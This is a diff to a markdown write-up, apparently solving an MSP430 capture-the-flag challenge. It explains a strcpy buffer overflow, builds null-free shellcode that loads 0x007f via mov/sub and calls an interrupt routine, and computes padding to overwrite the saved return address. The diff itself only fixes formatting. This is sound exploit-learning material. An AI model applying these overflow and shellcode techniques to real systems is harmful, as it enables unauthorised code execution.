@@ -28,7 +28,7 @@ We can therefore overwrite the return address with the address of our own instru
 
 ```asm
 push 0x007f
-call <INT> #0x454c  -> `3012 7f00 b012 4c45` 
+call <INT> #0x454c  -> 3012 7f00 b012 4c45 
 
 -> we would still need to add our return address and padding 
 ```
@@ -37,7 +37,7 @@ Because the program uses `strcpy`, any `0x00` byte within our input acts as a st
 
 Our previous payload used:
 
-```
+```asm
 push #0x007f
 call #0x454c
 ```
@@ -56,7 +56,7 @@ Instead of directly pushing the immediate value `0x007f`, to the stack to be use
 
 This avoids the `0x00` problem for the push.
 
-```
+```asm
 0f12 push r15 
 ```
 
@@ -70,7 +70,7 @@ We cannot simply use `#0xff` and `#0x80`, because MSP430 immediate operands are 
 
 The encoded instructions now contain no null bytes, while the value produced in `r15` is still `0x007f`.
 
-```
+```asm
 3f40 ff01       mov #0x01ff, r15
 3f80 8001       sub #0x0180, r15  
 
@@ -79,7 +79,7 @@ will result in -> r15 = 0x007f
 
 We can then add a `push` and a `call` to complete the instructions in our payload.
 
-```
+```asm
 0f12            push r15
 b012 4c45       call <INT> #0x454c
 ```
@@ -95,7 +95,7 @@ Result: `3f40 ff01 3f80 8001 0f12 b012 4c45`
 The instructions are 14 bytes long. Beginning at `0x43ee`, they occupy addresses `0x43ee` through `0x43fb`, making `0x43fc` the next available address.
 
 ```
-	`0x43ee` + `e (14 decimal)` = `0x43fc` 
+	0x43ee + e (14 decimal) = 0x43fc 
 ```
 
 Because the saved return address begins at `0x43fe`, we need two bytes of padding at `0x43fc–0x43fd` before writing `0x43ee` over the saved return address.
